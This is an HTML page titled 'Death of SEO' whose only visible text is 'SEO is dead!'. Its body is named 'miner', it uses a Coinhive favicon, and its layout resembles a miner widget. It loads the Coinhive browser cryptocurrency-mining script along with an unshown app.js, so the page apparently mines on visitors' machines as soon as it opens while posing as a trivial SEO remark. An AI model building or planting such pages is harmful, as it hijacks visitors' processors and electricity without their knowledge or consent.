<!doctype html>
<html lang="en-us">
<head>
	<title>Death of SEO</title>
	<meta charset="UTF-8" name="description" content="SEO is dead"/>
	<link rel="icon" type="image/png" href="/media/coinhive-icon.png">
	<meta name="viewport" content="width=device-width">
	<style>
		* {
			-webkit-box-sizing: border-box;
			-moz-box-sizing: border-box;
			box-sizing: border-box;
		}
		html, body { overflow: hidden; }
		body {
			background: #fff;
			font-family: sans-serif;
			line-height: 1.3;
			color: #555;
			font-size: 14px;
			padding: 0;
			margin: 0 auto;
			max-width: 300px;
			position: relative;
		}

		/* Landscape */
		@media (min-width: 480px) and (max-height: 320px) {
			body { max-width: 600px; }
			@media (max-height: 240px) { #graph-canvas {height: 64px;} }
			@media (max-height: 176px) { #graph-canvas {display: none;} div.foot { text-align: left;} }
		}
		@media (max-width: 176px) { .powered-by { display: none; } }

		/* Portrait */
		@media (max-width: 255px) {
			@media (max-height: 444px) { #graph-canvas {height: 64px;} }
			@media (max-height: 380px) { #graph-canvas {display: none;} div.foot { text-align: left;} }
		}

		/* Small rect */
		@media (max-width: 479px) {
			@media (max-height: 298px) { #graph-canvas {height: 64px;} }
			@media (max-height: 230px) { #graph-canvas {display: none;} div.foot { text-align: left;} }
			@media (max-height: 140px) { .box.controls {display: none;}}
		}
	</style>
	<style id="extra-styles"></style>
</head>
<body id="miner">
	<div class="container">
		<p>SEO is dead!</p>
	</div>

	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
	<script src="app.js"></script>
</body>
</html>
